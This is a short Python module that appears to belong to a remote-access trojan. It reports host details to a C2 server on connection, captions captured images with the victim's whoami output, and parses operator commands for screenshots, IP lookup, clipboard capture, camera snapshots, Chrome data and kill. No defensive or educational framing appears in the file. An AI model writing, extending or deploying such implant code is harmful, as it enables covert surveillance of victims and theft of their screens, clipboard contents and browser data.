from datetime import datetime
from payload.acquire import Acquire
from payload.browser.browser import Browser
 
acquire = Acquire()
browser = Browser()

def connected_message():
    # ensures connectivity to the c2 server
    host_details = acquire.get_host_details() 
    timestamp_connect = datetime.now()

    message = f"[+] Connected Successfully at {timestamp_connect}\n\n{host_details}"

    return message

def image_caption(source):
    return f'{source} {acquire.get_whoami()} dated {datetime.now().strftime("%m/%d/%Y %H:%M:%S")}'

# utility
def parse_commands(cmd):
    if cmd.startswith('/'):
        if "screenshot " in cmd:
            return ("screenshot", "Null")
        elif "getip" in cmd:
            return ("getip", "Null")
        elif "whoami" in cmd:
            return ("whoami", "Null")
        elif "screenshot" in cmd:
            return ("screenshot", "Null")
        elif "clipboard" in cmd:
            return ("clipboard", "Null")
        elif "snapshot" in cmd:
            return("snapshot", "Null")
        elif "chrome" in cmd:
            return ("chrome", "Null")
        elif "kill" in cmd:
            return ("kill", "Null")
    else:
        pass
